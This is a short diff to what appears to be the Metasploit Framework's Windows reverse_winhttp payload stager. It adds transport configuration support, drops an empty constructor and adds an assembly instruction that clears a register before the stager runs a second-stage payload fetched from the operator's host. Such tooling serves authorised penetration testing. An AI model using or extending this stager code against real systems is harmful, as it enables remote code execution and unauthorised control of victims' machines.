@@ -1,6 +1,7 @@
 # -*- coding: binary -*-
 
 require 'msf/core'
+require 'msf/core/payload/transport_config'
 require 'msf/core/payload/windows/block_api'
 require 'msf/core/payload/windows/exitfunk'
 require 'msf/core/payload/windows/reverse_http'
@@ -17,14 +18,8 @@ module Msf
 
 module Payload::Windows::ReverseWinHttp
 
+  include Msf::Payload::TransportConfig
   include Msf::Payload::Windows::ReverseHttp
-
-  #
-  # Register reverse_winhttp specific options
-  #
-  def initialize(*args)
-    super
-  end
 
   #
   # Generate the first stage
@@ -52,6 +47,9 @@ module Payload::Windows::ReverseWinHttp
     generate_reverse_winhttp(conf)
   end
 
+  def transport_config(opts={})
+    transport_config_reverse_http(opts)
+  end
   #
   # Generate and compile the stager
   #
@@ -371,6 +369,8 @@ module Payload::Windows::ReverseWinHttp
           pop eax                ; clear the temporary storage
 
         execute_stage:
+          xor edi, edi           ; clear EDI, so we don't mislead meterpreter into
+                                 ; thinking it has a valid socket to play with
           ret                    ; dive into the stored stage address
 
         got_server_uri:
